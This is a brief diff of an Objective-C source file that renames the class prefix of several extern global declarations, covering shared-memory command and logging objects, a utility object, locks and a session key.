@@ -48,9 +48,9 @@
 
 typedef struct kinfo_proc kinfo_proc;
 
-extern RCSMSharedMemory  *gSharedMemoryCommand;
-extern RCSMSharedMemory  *gSharedMemoryLogging;
-extern RCSMUtils         *gUtil;
+extern __m_MSharedMemory  *gSharedMemoryCommand;
+extern __m_MSharedMemory  *gSharedMemoryLogging;
+extern __m_MUtils         *gUtil;
 extern NSLock            *gSuidLock;
 extern NSLock            *gControlFlagLock;
 extern NSData            *gSessionKey;
